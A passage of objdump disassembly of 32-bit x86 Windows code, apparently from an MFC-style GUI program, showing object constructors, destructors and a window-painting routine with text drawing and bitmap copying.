  40413b:	52                   	push   %edx
  40413c:	ff 15 80 85 41 00    	call   *0x418580
  404142:	8b f0                	mov    %eax,%esi
  404144:	83 c4 08             	add    $0x8,%esp
  404147:	85 f6                	test   %esi,%esi
  404149:	75 2a                	jne    0x404175
  40414b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40414f:	68 54 e4 41 00       	push   $0x41e454
  404154:	50                   	push   %eax
  404155:	ff 15 7c 85 41 00    	call   *0x41857c
  40415b:	8b f0                	mov    %eax,%esi
  40415d:	83 c4 08             	add    $0x8,%esp
  404160:	85 f6                	test   %esi,%esi
  404162:	75 11                	jne    0x404175
  404164:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404168:	51                   	push   %ecx
  404169:	ff 15 8c 80 41 00    	call   *0x41808c
  40416f:	8d 74 04 0f          	lea    0xf(%esp,%eax,1),%esi
  404173:	eb 03                	jmp    0x404178
  404175:	c6 06 00             	movb   $0x0,(%esi)
  404178:	68 50 e4 41 00       	push   $0x41e450
  40417d:	56                   	push   %esi
  40417e:	ff d3                	call   *%ebx
  404180:	8b 94 24 1c 02 00 00 	mov    0x21c(%esp),%edx
  404187:	52                   	push   %edx
  404188:	56                   	push   %esi
  404189:	ff d3                	call   *%ebx
  40418b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40418f:	55                   	push   %ebp
  404190:	50                   	push   %eax
  404191:	ff 15 88 80 41 00    	call   *0x418088
  404197:	5f                   	pop    %edi
  404198:	5e                   	pop    %esi
  404199:	5d                   	pop    %ebp
  40419a:	5b                   	pop    %ebx
  40419b:	81 c4 08 02 00 00    	add    $0x208,%esp
  4041a1:	c2 08 00             	ret    $0x8
  4041a4:	8b c6                	mov    %esi,%eax
  4041a6:	5f                   	pop    %edi
  4041a7:	5e                   	pop    %esi
  4041a8:	5d                   	pop    %ebp
  4041a9:	5b                   	pop    %ebx
  4041aa:	81 c4 08 02 00 00    	add    $0x208,%esp
  4041b0:	c2 08 00             	ret    $0x8
  4041b3:	90                   	nop
  4041b4:	90                   	nop
  4041b5:	90                   	nop
  4041b6:	90                   	nop
  4041b7:	90                   	nop
  4041b8:	90                   	nop
  4041b9:	90                   	nop
  4041ba:	90                   	nop
  4041bb:	90                   	nop
  4041bc:	90                   	nop
  4041bd:	90                   	nop
  4041be:	90                   	nop
  4041bf:	90                   	nop
  4041c0:	56                   	push   %esi
  4041c1:	8b f1                	mov    %ecx,%esi
  4041c3:	e8 18 00 00 00       	call   0x4041e0
  4041c8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4041cd:	74 09                	je     0x4041d8
  4041cf:	56                   	push   %esi
  4041d0:	e8 db fc 00 00       	call   0x413eb0
  4041d5:	83 c4 04             	add    $0x4,%esp
  4041d8:	8b c6                	mov    %esi,%eax
  4041da:	5e                   	pop    %esi
  4041db:	c2 04 00             	ret    $0x4
  4041de:	90                   	nop
  4041df:	90                   	nop
  4041e0:	6a ff                	push   $0xffffffff
  4041e2:	68 58 4e 41 00       	push   $0x414e58
  4041e7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4041ed:	50                   	push   %eax
  4041ee:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4041f5:	51                   	push   %ecx
  4041f6:	56                   	push   %esi
  4041f7:	8b f1                	mov    %ecx,%esi
  4041f9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4041fd:	c7 06 08 8a 41 00    	movl   $0x418a08,(%esi)
  404203:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40420a:	00 
  40420b:	e8 3e fe 00 00       	call   0x41404e
  404210:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404214:	c7 06 f4 89 41 00    	movl   $0x4189f4,(%esi)
  40421a:	5e                   	pop    %esi
  40421b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404222:	83 c4 10             	add    $0x10,%esp
  404225:	c3                   	ret
  404226:	90                   	nop
  404227:	90                   	nop
  404228:	90                   	nop
  404229:	90                   	nop
  40422a:	90                   	nop
  40422b:	90                   	nop
  40422c:	90                   	nop
  40422d:	90                   	nop
  40422e:	90                   	nop
  40422f:	90                   	nop
  404230:	56                   	push   %esi
  404231:	8b f1                	mov    %ecx,%esi
  404233:	e8 3e 00 01 00       	call   0x414276
  404238:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40423d:	74 09                	je     0x404248
  40423f:	56                   	push   %esi
  404240:	e8 6b fc 00 00       	call   0x413eb0
  404245:	83 c4 04             	add    $0x4,%esp
  404248:	8b c6                	mov    %esi,%eax
  40424a:	5e                   	pop    %esi
  40424b:	c2 04 00             	ret    $0x4
  40424e:	90                   	nop
  40424f:	90                   	nop
  404250:	a1 2c 81 41 00       	mov    0x41812c,%eax
  404255:	c3                   	ret
  404256:	90                   	nop
  404257:	90                   	nop
  404258:	90                   	nop
  404259:	90                   	nop
  40425a:	90                   	nop
  40425b:	90                   	nop
  40425c:	90                   	nop
  40425d:	90                   	nop
  40425e:	90                   	nop
  40425f:	90                   	nop
  404260:	b8 58 92 41 00       	mov    $0x419258,%eax
  404265:	c3                   	ret
  404266:	90                   	nop
  404267:	90                   	nop
  404268:	90                   	nop
  404269:	90                   	nop
  40426a:	90                   	nop
  40426b:	90                   	nop
  40426c:	90                   	nop
  40426d:	90                   	nop
  40426e:	90                   	nop
  40426f:	90                   	nop
  404270:	6a ff                	push   $0xffffffff
  404272:	68 94 4e 41 00       	push   $0x414e94
  404277:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40427d:	50                   	push   %eax
  40427e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404285:	51                   	push   %ecx
  404286:	53                   	push   %ebx
  404287:	55                   	push   %ebp
  404288:	56                   	push   %esi
  404289:	8b f1                	mov    %ecx,%esi
  40428b:	57                   	push   %edi
  40428c:	89 74 24 10          	mov    %esi,0x10(%esp)
  404290:	e8 a7 fd 00 00       	call   0x41403c
  404295:	c7 06 08 91 41 00    	movl   $0x419108,(%esi)
  40429b:	8d ae 88 00 00 00    	lea    0x88(%esi),%ebp
  4042a1:	33 ff                	xor    %edi,%edi
  4042a3:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  4042a7:	89 7d 04             	mov    %edi,0x4(%ebp)
  4042aa:	c7 45 00 f0 90 41 00 	movl   $0x4190f0,0x0(%ebp)
  4042b1:	8d 8e 90 00 00 00    	lea    0x90(%esi),%ecx
  4042b7:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  4042bc:	e8 35 fe 00 00       	call   0x4140f6
  4042c1:	6a 08                	push   $0x8
  4042c3:	c6 44 24 20 02       	movb   $0x2,0x20(%esp)
  4042c8:	c7 06 60 92 41 00    	movl   $0x419260,(%esi)
  4042ce:	ff 15 54 86 41 00    	call   *0x418654
  4042d4:	8d 5e 4c             	lea    0x4c(%esi),%ebx
  4042d7:	89 46 40             	mov    %eax,0x40(%esi)
  4042da:	53                   	push   %ebx
  4042db:	6a 3c                	push   $0x3c
  4042dd:	6a 11                	push   $0x11
  4042df:	89 7e 48             	mov    %edi,0x48(%esi)
  4042e2:	ff 15 34 80 41 00    	call   *0x418034
  4042e8:	50                   	push   %eax
  4042e9:	ff 15 2c 80 41 00    	call   *0x41802c
  4042ef:	53                   	push   %ebx
  4042f0:	ff 15 30 80 41 00    	call   *0x418030
  4042f6:	50                   	push   %eax
  4042f7:	8b cd                	mov    %ebp,%ecx
  4042f9:	e8 4c fe 00 00       	call   0x41414a
  4042fe:	6a 0f                	push   $0xf
  404300:	89 be 98 00 00 00    	mov    %edi,0x98(%esi)
  404306:	89 be 94 00 00 00    	mov    %edi,0x94(%esi)
  40430c:	89 be a0 00 00 00    	mov    %edi,0xa0(%esi)
  404312:	c7 86 9c 00 00 00 01 	movl   $0x1,0x9c(%esi)
  404319:	00 00 00 
  40431c:	89 be a8 00 00 00    	mov    %edi,0xa8(%esi)
  404322:	89 be a4 00 00 00    	mov    %edi,0xa4(%esi)
  404328:	89 be b0 00 00 00    	mov    %edi,0xb0(%esi)
  40432e:	89 be b8 00 00 00    	mov    %edi,0xb8(%esi)
  404334:	89 be b4 00 00 00    	mov    %edi,0xb4(%esi)
  40433a:	89 be bc 00 00 00    	mov    %edi,0xbc(%esi)
  404340:	ff 15 54 86 41 00    	call   *0x418654
  404346:	50                   	push   %eax
  404347:	ff 15 38 80 41 00    	call   *0x418038
  40434d:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404351:	89 46 44             	mov    %eax,0x44(%esi)
  404354:	8b c6                	mov    %esi,%eax
  404356:	5f                   	pop    %edi
  404357:	5e                   	pop    %esi
  404358:	5d                   	pop    %ebp
  404359:	5b                   	pop    %ebx
  40435a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404361:	83 c4 10             	add    $0x10,%esp
  404364:	c3                   	ret
  404365:	90                   	nop
  404366:	90                   	nop
  404367:	90                   	nop
  404368:	90                   	nop
  404369:	90                   	nop
  40436a:	90                   	nop
  40436b:	90                   	nop
  40436c:	90                   	nop
  40436d:	90                   	nop
  40436e:	90                   	nop
  40436f:	90                   	nop
  404370:	56                   	push   %esi
  404371:	8b f1                	mov    %ecx,%esi
  404373:	e8 18 00 00 00       	call   0x404390
  404378:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40437d:	74 09                	je     0x404388
  40437f:	56                   	push   %esi
  404380:	e8 2b fb 00 00       	call   0x413eb0
  404385:	83 c4 04             	add    $0x4,%esp
  404388:	8b c6                	mov    %esi,%eax
  40438a:	5e                   	pop    %esi
  40438b:	c2 04 00             	ret    $0x4
  40438e:	90                   	nop
  40438f:	90                   	nop
  404390:	6a ff                	push   $0xffffffff
  404392:	68 cc 4e 41 00       	push   $0x414ecc
  404397:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40439d:	50                   	push   %eax
  40439e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4043a5:	83 ec 08             	sub    $0x8,%esp
  4043a8:	53                   	push   %ebx
  4043a9:	56                   	push   %esi
  4043aa:	8b f1                	mov    %ecx,%esi
  4043ac:	57                   	push   %edi
  4043ad:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4043b1:	c7 06 60 92 41 00    	movl   $0x419260,(%esi)
  4043b7:	8d be 88 00 00 00    	lea    0x88(%esi),%edi
  4043bd:	c7 44 24 1c 02 00 00 	movl   $0x2,0x1c(%esp)
  4043c4:	00 
  4043c5:	8b cf                	mov    %edi,%ecx
  4043c7:	e8 82 fc 00 00       	call   0x41404e
  4043cc:	8b 46 44             	mov    0x44(%esi),%eax
  4043cf:	8b 1d 24 80 41 00    	mov    0x418024,%ebx
  4043d5:	50                   	push   %eax
  4043d6:	ff d3                	call   *%ebx
  4043d8:	8b 4e 48             	mov    0x48(%esi),%ecx
  4043db:	51                   	push   %ecx
  4043dc:	ff d3                	call   *%ebx
  4043de:	8d 8e 90 00 00 00    	lea    0x90(%esi),%ecx
  4043e4:	c6 44 24 1c 01       	movb   $0x1,0x1c(%esp)
  4043e9:	e8 ea fc 00 00       	call   0x4140d8
  4043ee:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4043f2:	c7 07 08 8a 41 00    	movl   $0x418a08,(%edi)
  4043f8:	8b cf                	mov    %edi,%ecx
  4043fa:	c6 44 24 1c 03       	movb   $0x3,0x1c(%esp)
  4043ff:	e8 4a fc 00 00       	call   0x41404e
  404404:	8b ce                	mov    %esi,%ecx
  404406:	c7 07 f4 89 41 00    	movl   $0x4189f4,(%edi)
  40440c:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  404413:	ff 
  404414:	e8 5d fe 00 00       	call   0x414276
  404419:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40441d:	5f                   	pop    %edi
  40441e:	5e                   	pop    %esi
  40441f:	5b                   	pop    %ebx
  404420:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404427:	83 c4 14             	add    $0x14,%esp
  40442a:	c3                   	ret
  40442b:	90                   	nop
  40442c:	90                   	nop
  40442d:	90                   	nop
  40442e:	90                   	nop
  40442f:	90                   	nop
  404430:	56                   	push   %esi
  404431:	8b f1                	mov    %ecx,%esi
  404433:	57                   	push   %edi
  404434:	8d be 88 00 00 00    	lea    0x88(%esi),%edi
  40443a:	8b cf                	mov    %edi,%ecx
  40443c:	e8 0d fc 00 00       	call   0x41404e
  404441:	83 c6 4c             	add    $0x4c,%esi
  404444:	56                   	push   %esi
  404445:	ff 15 30 80 41 00    	call   *0x418030
  40444b:	50                   	push   %eax
  40444c:	8b cf                	mov    %edi,%ecx
  40444e:	e8 f7 fc 00 00       	call   0x41414a
  404453:	5f                   	pop    %edi
  404454:	5e                   	pop    %esi
  404455:	c3                   	ret
  404456:	90                   	nop
  404457:	90                   	nop
  404458:	90                   	nop
  404459:	90                   	nop
  40445a:	90                   	nop
  40445b:	90                   	nop
  40445c:	90                   	nop
  40445d:	90                   	nop
  40445e:	90                   	nop
  40445f:	90                   	nop
  404460:	6a ff                	push   $0xffffffff
  404462:	68 23 4f 41 00       	push   $0x414f23
  404467:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40446d:	50                   	push   %eax
  40446e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  404475:	81 ec 90 00 00 00    	sub    $0x90,%esp
  40447b:	53                   	push   %ebx
  40447c:	55                   	push   %ebp
  40447d:	56                   	push   %esi
  40447e:	57                   	push   %edi
  40447f:	8b f9                	mov    %ecx,%edi
  404481:	8d 4c 24 4c          	lea    0x4c(%esp),%ecx
  404485:	57                   	push   %edi
  404486:	e8 21 fe 00 00       	call   0x4142ac
  40448b:	8b 4f 20             	mov    0x20(%edi),%ecx
  40448e:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404492:	33 f6                	xor    %esi,%esi
  404494:	50                   	push   %eax
  404495:	51                   	push   %ecx
  404496:	89 b4 24 b0 00 00 00 	mov    %esi,0xb0(%esp)
  40449d:	33 ed                	xor    %ebp,%ebp
  40449f:	ff 15 38 86 41 00    	call   *0x418638
  4044a5:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4044a9:	e8 48 fc 00 00       	call   0x4140f6
  4044ae:	8d 54 24 10          	lea    0x10(%esp),%edx
  4044b2:	8b cf                	mov    %edi,%ecx
  4044b4:	52                   	push   %edx
  4044b5:	c6 84 24 ac 00 00 00 	movb   $0x1,0xac(%esp)
  4044bc:	01 
  4044bd:	e8 2e fc 00 00       	call   0x4140f0
  4044c2:	89 74 24 30          	mov    %esi,0x30(%esp)
  4044c6:	c7 44 24 2c 1c 89 41 	movl   $0x41891c,0x2c(%esp)
  4044cd:	00 
  4044ce:	8b 87 a0 00 00 00    	mov    0xa0(%edi),%eax
  4044d4:	bb 02 00 00 00       	mov    $0x2,%ebx
  4044d9:	3b c6                	cmp    %esi,%eax
  4044db:	88 9c 24 a8 00 00 00 	mov    %bl,0xa8(%esp)
  4044e2:	75 78                	jne    0x40455c
  4044e4:	6a 10                	push   $0x10
  4044e6:	e8 bb fd 00 00       	call   0x4142a6
  4044eb:	83 c4 04             	add    $0x4,%esp
  4044ee:	89 44 24 34          	mov    %eax,0x34(%esp)
  4044f2:	3b c6                	cmp    %esi,%eax
  4044f4:	c6 84 24 a8 00 00 00 	movb   $0x3,0xa8(%esp)
  4044fb:	03 
  4044fc:	74 09                	je     0x404507
  4044fe:	8b c8                	mov    %eax,%ecx
  404500:	e8 2b fb 00 00       	call   0x414030
  404505:	8b f0                	mov    %eax,%esi
  404507:	8b 44 24 50          	mov    0x50(%esp),%eax
  40450b:	88 9c 24 a8 00 00 00 	mov    %bl,0xa8(%esp)
  404512:	50                   	push   %eax
  404513:	ff 15 54 80 41 00    	call   *0x418054
  404519:	50                   	push   %eax
  40451a:	8b ce                	mov    %esi,%ecx
  40451c:	e8 ff fb 00 00       	call   0x414120
  404521:	8b 44 24 28          	mov    0x28(%esp),%eax
  404525:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  404529:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40452d:	2b c1                	sub    %ecx,%eax
  40452f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404533:	50                   	push   %eax
  404534:	2b ca                	sub    %edx,%ecx
  404536:	51                   	push   %ecx
  404537:	8b 4c 24 58          	mov    0x58(%esp),%ecx
  40453b:	51                   	push   %ecx
  40453c:	ff 15 50 80 41 00    	call   *0x418050
  404542:	50                   	push   %eax
  404543:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  404547:	e8 fe fb 00 00       	call   0x41414a
  40454c:	8b 54 24 30          	mov    0x30(%esp),%edx
  404550:	8b 46 04             	mov    0x4(%esi),%eax
  404553:	52                   	push   %edx
  404554:	50                   	push   %eax
  404555:	e8 fa fa 00 00       	call   0x414054
  40455a:	eb 04                	jmp    0x404560
  40455c:	8d 74 24 4c          	lea    0x4c(%esp),%esi
  404560:	6a 01                	push   $0x1
  404562:	8b ce                	mov    %esi,%ecx
  404564:	e8 75 fb 00 00       	call   0x4140de
  404569:	8b 16                	mov    (%esi),%edx
  40456b:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40456f:	8b 47 40             	mov    0x40(%edi),%eax
  404572:	8b ce                	mov    %esi,%ecx
  404574:	50                   	push   %eax
  404575:	ff 52 38             	call   *0x38(%edx)
  404578:	8b 16                	mov    (%esi),%edx
  40457a:	89 44 24 34          	mov    %eax,0x34(%esp)
  40457e:	8d 87 88 00 00 00    	lea    0x88(%edi),%eax
  404584:	8b ce                	mov    %esi,%ecx
  404586:	50                   	push   %eax
  404587:	ff 52 30             	call   *0x30(%edx)
  40458a:	89 44 24 38          	mov    %eax,0x38(%esp)
  40458e:	8b 87 a0 00 00 00    	mov    0xa0(%edi),%eax
  404594:	85 c0                	test   %eax,%eax
  404596:	0f 85 8e 00 00 00    	jne    0x40462a
  40459c:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4045a3:	00 
  4045a4:	c7 44 24 14 e8 8b 41 	movl   $0x418be8,0x14(%esp)
  4045ab:	00 
  4045ac:	8b 87 94 00 00 00    	mov    0x94(%edi),%eax
  4045b2:	c6 84 24 a8 00 00 00 	movb   $0x4,0xa8(%esp)
  4045b9:	04 
  4045ba:	85 c0                	test   %eax,%eax
  4045bc:	74 18                	je     0x4045d6
  4045be:	39 9f a4 00 00 00    	cmp    %ebx,0xa4(%edi)
  4045c4:	75 10                	jne    0x4045d6
  4045c6:	8b 47 48             	mov    0x48(%edi),%eax
  4045c9:	85 c0                	test   %eax,%eax
  4045cb:	74 03                	je     0x4045d0
  4045cd:	50                   	push   %eax
  4045ce:	eb 14                	jmp    0x4045e4
  4045d0:	8b 4f 44             	mov    0x44(%edi),%ecx
  4045d3:	51                   	push   %ecx
  4045d4:	eb 0e                	jmp    0x4045e4
  4045d6:	8b 47 48             	mov    0x48(%edi),%eax
  4045d9:	85 c0                	test   %eax,%eax
  4045db:	74 03                	je     0x4045e0
  4045dd:	50                   	push   %eax
  4045de:	eb 04                	jmp    0x4045e4
  4045e0:	8b 57 44             	mov    0x44(%edi),%edx
  4045e3:	52                   	push   %edx
  4045e4:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4045e8:	e8 5d fb 00 00       	call   0x41414a
  4045ed:	8b 44 24 18          	mov    0x18(%esp),%eax
  4045f1:	8b 56 04             	mov    0x4(%esi),%edx
  4045f4:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4045f8:	50                   	push   %eax
  4045f9:	51                   	push   %ecx
  4045fa:	52                   	push   %edx
  4045fb:	ff 15 50 86 41 00    	call   *0x418650
  404601:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  404605:	e8 96 fc 00 00       	call   0x4142a0
  40460a:	c7 44 24 14 08 8a 41 	movl   $0x418a08,0x14(%esp)
  404611:	00 
  404612:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  404616:	c6 84 24 a8 00 00 00 	movb   $0x5,0xa8(%esp)
  40461d:	05 
  40461e:	e8 2b fa 00 00       	call   0x41404e
  404623:	88 9c 24 a8 00 00 00 	mov    %bl,0xa8(%esp)
  40462a:	8b 57 48             	mov    0x48(%edi),%edx
  40462d:	33 c0                	xor    %eax,%eax
  40462f:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  404633:	89 44 24 40          	mov    %eax,0x40(%esp)
  404637:	51                   	push   %ecx
  404638:	89 44 24 48          	mov    %eax,0x48(%esp)
  40463c:	6a 0c                	push   $0xc
  40463e:	52                   	push   %edx
  40463f:	89 44 24 54          	mov    %eax,0x54(%esp)
  404643:	ff 15 2c 80 41 00    	call   *0x41802c
  404649:	8b 87 94 00 00 00    	mov    0x94(%edi),%eax
  40464f:	85 c0                	test   %eax,%eax
  404651:	75 15                	jne    0x404668
  404653:	83 bf a4 00 00 00 01 	cmpl   $0x1,0xa4(%edi)
  40465a:	75 0c                	jne    0x404668
  40465c:	8b 4c 24 44          	mov    0x44(%esp),%ecx
  404660:	8b 06                	mov    (%esi),%eax
  404662:	51                   	push   %ecx
  404663:	8b ce                	mov    %esi,%ecx
  404665:	ff 50 38             	call   *0x38(%eax)
  404668:	8b cf                	mov    %edi,%ecx
  40466a:	e8 0d fc 00 00       	call   0x41427c
  40466f:	a8 0c                	test   $0xc,%al
  404671:	75 05                	jne    0x404678
  404673:	bd 10 00 00 00       	mov    $0x10,%ebp
  404678:	8b cf                	mov    %edi,%ecx
  40467a:	e8 fd fb 00 00       	call   0x41427c
  40467f:	8b cf                	mov    %edi,%ecx
  404681:	e8 f6 fb 00 00       	call   0x41427c
  404686:	84 c3                	test   %al,%bl
  404688:	74 02                	je     0x40468c
  40468a:	8b eb                	mov    %ebx,%ebp
  40468c:	8b cf                	mov    %edi,%ecx
  40468e:	e8 e9 fb 00 00       	call   0x41427c
  404693:	a8 01                	test   $0x1,%al
  404695:	74 05                	je     0x40469c
  404697:	bd 01 00 00 00       	mov    $0x1,%ebp
  40469c:	8b cf                	mov    %edi,%ecx
  40469e:	e8 d9 fb 00 00       	call   0x41427c
  4046a3:	f6 c4 02             	test   $0x2,%ah
  4046a6:	74 1d                	je     0x4046c5
  4046a8:	68 84 e4 41 00       	push   $0x41e484
  4046ad:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4046b1:	bd 01 00 00 00       	mov    $0x1,%ebp
  4046b6:	e8 df fb 00 00       	call   0x41429a
  4046bb:	83 f8 ff             	cmp    $0xffffffff,%eax
  4046be:	75 05                	jne    0x4046c5
  4046c0:	bd 25 00 00 00       	mov    $0x25,%ebp
  4046c5:	8b 87 bc 00 00 00    	mov    0xbc(%edi),%eax
  4046cb:	85 c0                	test   %eax,%eax
  4046cd:	0f 84 82 00 00 00    	je     0x404755
  4046d3:	6a 18                	push   $0x18
  4046d5:	8b ce                	mov    %esi,%ecx
  4046d7:	e8 b8 fb 00 00       	call   0x414294
  4046dc:	8b e8                	mov    %eax,%ebp
  4046de:	8b 46 04             	mov    0x4(%esi),%eax
  4046e1:	8d 54 24 14          	lea    0x14(%esp),%edx
  4046e5:	52                   	push   %edx
  4046e6:	50                   	push   %eax
  4046e7:	ff 15 60 80 41 00    	call   *0x418060
  4046ed:	8b 44 24 28          	mov    0x28(%esp),%eax
  4046f1:	8b 54 24 20          	mov    0x20(%esp),%edx
  4046f5:	2b c2                	sub    %edx,%eax
  4046f7:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4046fb:	99                   	cltd
  4046fc:	2b c2                	sub    %edx,%eax
  4046fe:	6a 00                	push   $0x0
  404700:	d1 f8                	sar    $1,%eax
  404702:	50                   	push   %eax
  404703:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404707:	2b c1                	sub    %ecx,%eax
  404709:	8b 4e 04             	mov    0x4(%esi),%ecx
  40470c:	99                   	cltd
  40470d:	8b 1d 20 80 41 00    	mov    0x418020,%ebx
  404713:	2b c2                	sub    %edx,%eax
  404715:	d1 f8                	sar    $1,%eax
  404717:	50                   	push   %eax
  404718:	51                   	push   %ecx
  404719:	ff d3                	call   *%ebx
  40471b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40471f:	8b 16                	mov    (%esi),%edx
  404721:	8b 48 f8             	mov    -0x8(%eax),%ecx
  404724:	51                   	push   %ecx
  404725:	50                   	push   %eax
  404726:	6a 00                	push   $0x0
  404728:	6a 00                	push   $0x0
  40472a:	8b ce                	mov    %esi,%ecx
  40472c:	ff 52 64             	call   *0x64(%edx)
  40472f:	8b 44 24 18          	mov    0x18(%esp),%eax
  404733:	6a 00                	push   $0x0
  404735:	99                   	cltd
  404736:	2b c2                	sub    %edx,%eax
  404738:	d1 f8                	sar    $1,%eax
  40473a:	50                   	push   %eax
  40473b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40473f:	99                   	cltd
  404740:	2b c2                	sub    %edx,%eax
  404742:	d1 f8                	sar    $1,%eax
  404744:	50                   	push   %eax
  404745:	8b 46 04             	mov    0x4(%esi),%eax
  404748:	50                   	push   %eax
  404749:	ff d3                	call   *%ebx
  40474b:	55                   	push   %ebp
  40474c:	8b ce                	mov    %esi,%ecx
  40474e:	e8 41 fb 00 00       	call   0x414294
  404753:	eb 66                	jmp    0x4047bb
  404755:	8b 44 24 10          	mov    0x10(%esp),%eax
  404759:	8b 16                	mov    (%esi),%edx
  40475b:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  40475f:	55                   	push   %ebp
  404760:	8b 48 f8             	mov    -0x8(%eax),%ecx
  404763:	53                   	push   %ebx
  404764:	51                   	push   %ecx
  404765:	50                   	push   %eax
  404766:	8b ce                	mov    %esi,%ecx
  404768:	ff 52 70             	call   *0x70(%edx)
  40476b:	8b 87 b0 00 00 00    	mov    0xb0(%edi),%eax
  404771:	85 c0                	test   %eax,%eax
  404773:	74 46                	je     0x4047bb
  404775:	8b 06                	mov    (%esi),%eax
  404777:	68 ff ff ff 00       	push   $0xffffff
  40477c:	8b ce                	mov    %esi,%ecx
  40477e:	ff 50 38             	call   *0x38(%eax)
  404781:	8b 87 ac 00 00 00    	mov    0xac(%edi),%eax
  404787:	85 c0                	test   %eax,%eax
  404789:	75 0b                	jne    0x404796
  40478b:	6a ff                	push   $0xffffffff
  40478d:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  404791:	6a ff                	push   $0xffffffff
  404793:	51                   	push   %ecx
  404794:	eb 09                	jmp    0x40479f
  404796:	6a 01                	push   $0x1
  404798:	8d 54 24 20          	lea    0x20(%esp),%edx
  40479c:	6a 01                	push   $0x1
  40479e:	52                   	push   %edx
  40479f:	ff 15 58 86 41 00    	call   *0x418658
  4047a5:	8b 44 24 10          	mov    0x10(%esp),%eax
  4047a9:	8b 16                	mov    (%esi),%edx
  4047ab:	8d 5c 24 1c          	lea    0x1c(%esp),%ebx
  4047af:	55                   	push   %ebp
  4047b0:	8b 48 f8             	mov    -0x8(%eax),%ecx
  4047b3:	53                   	push   %ebx
  4047b4:	51                   	push   %ecx
  4047b5:	50                   	push   %eax
  4047b6:	8b ce                	mov    %esi,%ecx
  4047b8:	ff 52 70             	call   *0x70(%edx)
  4047bb:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  4047bf:	8b ce                	mov    %esi,%ecx
  4047c1:	50                   	push   %eax
  4047c2:	e8 17 f9 00 00       	call   0x4140de
  4047c7:	8b 44 24 38          	mov    0x38(%esp),%eax
  4047cb:	8b 16                	mov    (%esi),%edx
  4047cd:	50                   	push   %eax
  4047ce:	8b ce                	mov    %esi,%ecx
  4047d0:	ff 52 30             	call   *0x30(%edx)
  4047d3:	8b 44 24 34          	mov    0x34(%esp),%eax
  4047d7:	8b 16                	mov    (%esi),%edx
  4047d9:	50                   	push   %eax
  4047da:	8b ce                	mov    %esi,%ecx
  4047dc:	ff 52 38             	call   *0x38(%edx)
  4047df:	8b 87 a0 00 00 00    	mov    0xa0(%edi),%eax
  4047e5:	85 c0                	test   %eax,%eax
  4047e7:	75 3b                	jne    0x404824
  4047e9:	8b 44 24 28          	mov    0x28(%esp),%eax
  4047ed:	8b 6c 24 20          	mov    0x20(%esp),%ebp
  4047f1:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4047f5:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  4047f9:	8b 56 04             	mov    0x4(%esi),%edx
  4047fc:	68 20 00 cc 00       	push   $0xcc0020
  404801:	6a 00                	push   $0x0
  404803:	2b c5                	sub    %ebp,%eax
  404805:	6a 00                	push   $0x0
  404807:	2b cb                	sub    %ebx,%ecx
  404809:	52                   	push   %edx
  40480a:	50                   	push   %eax
  40480b:	51                   	push   %ecx
  40480c:	8b 4c 24 68          	mov    0x68(%esp),%ecx
  404810:	6a 00                	push   $0x0
  404812:	6a 00                	push   $0x0
  404814:	51                   	push   %ecx
  404815:	ff 15 5c 80 41 00    	call   *0x41805c
  40481b:	8b 16                	mov    (%esi),%edx
  40481d:	6a 01                	push   $0x1
  40481f:	8b ce                	mov    %esi,%ecx
  404821:	ff 52 04             	call   *0x4(%edx)
  404824:	c7 44 24 2c 08 8a 41 	movl   $0x418a08,0x2c(%esp)
  40482b:	00 
  40482c:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  404830:	c6 84 24 a8 00 00 00 	movb   $0x6,0xa8(%esp)
  404837:	06 
  404838:	e8 11 f8 00 00       	call   0x41404e
  40483d:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  404841:	c7 44 24 2c f4 89 41 	movl   $0x4189f4,0x2c(%esp)
  404848:	00 
  404849:	c6 84 24 a8 00 00 00 	movb   $0x0,0xa8(%esp)
  404850:	00 
  404851:	e8 82 f8 00 00       	call   0x4140d8
